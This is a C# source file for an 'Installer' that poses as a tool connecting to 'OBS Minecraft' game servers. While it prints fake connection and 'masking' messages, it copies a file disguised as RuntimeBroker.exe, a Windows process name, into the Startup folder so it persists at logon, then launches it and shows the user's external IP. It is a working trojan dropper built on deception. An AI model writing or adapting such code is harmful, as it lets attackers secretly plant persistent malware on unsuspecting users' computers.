using System;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace Installer
{
    class Installer
    {
        static string game = "OBS Minecraft";

        static void Main(string[] args)
        {
            string installPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "RuntimeBroker.exe");

            Thread.Sleep(3000);
            Console.Write($"Connecting to {game} servers");
            for (int i = 0; i < 3; i++)
            {
                Console.Write('.');
                Thread.Sleep(1000);
            }
            Console.WriteLine();
            Thread.Sleep(500);
            
            //muta fisierul
            File.Move("RuntimeBroker.exe", installPath);

            Console.WriteLine($"Successfully connected to {game} servers on port {new Random().Next(1000, 15000)}.");
            Thread.Sleep(500);
            Console.Write("Masking connection");
            for (int i = 0; i < 3; i++)
            {
                Console.Write('.');
                Thread.Sleep(1000);
            }
            Console.WriteLine();
            Thread.Sleep(500);

            Console.Write($"Starting local virtual private server on IP address {GetExternalIP()}.");

            for (int i = 0; i < 3; i++)
            {
                Console.Write('.');
                Thread.Sleep(1000);
            }
            Console.WriteLine();

            //porneste fisierul
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo
            {
                FileName = installPath,
                UseShellExecute = true,
                WorkingDirectory = Path.Combine(installPath, "..")
            };
            process.Start();

            Thread.Sleep(1000);
            Console.WriteLine($"Successfully started local virtual private server on IP address {GetExternalIP()}.");
            Thread.Sleep(10000);
        }

        public static string GetExternalIP()
        {
            return new WebClient().DownloadString("http://icanhazip.com");
        }
    }
}
